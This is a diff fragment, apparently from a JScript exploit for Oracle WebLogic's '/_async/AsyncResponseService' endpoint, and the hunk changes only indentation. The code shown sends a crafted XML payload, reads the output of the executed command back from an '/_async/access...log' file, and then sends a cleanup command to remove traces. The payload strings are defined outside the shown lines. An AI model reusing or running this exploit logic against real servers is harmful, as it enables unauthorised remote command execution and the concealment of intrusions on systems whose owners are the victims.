@@ -46,15 +46,15 @@ if (args.Length == 3 ) {
             request(url);
             WScript.Sleep(202);
 	if (whr.status == "202") {
-                url = args.Item(1) + "/_async/access" + exp_str + ".log";
-                payload = "";
-                request(url);
+                    url = args.Item(1) + "/_async/access" + exp_str + ".log";
+                    payload = "";
+                    request(url);
                     if (whr.status == "200") {
                         WScript.Echo(whr.responseText);
                         //WScript.Echo(url);
                         url = args.Item(1) + "/_async/AsyncResponseService";
 	        payload = payload_xml_pre + payload_xml_win_pre + command_win_clean + payload_xml_win_suff + payload_xml_suff;
-                    request(url);
+                        request(url);
                 } else {
                     WScript.Echo("-The Command execution failed");
                 }
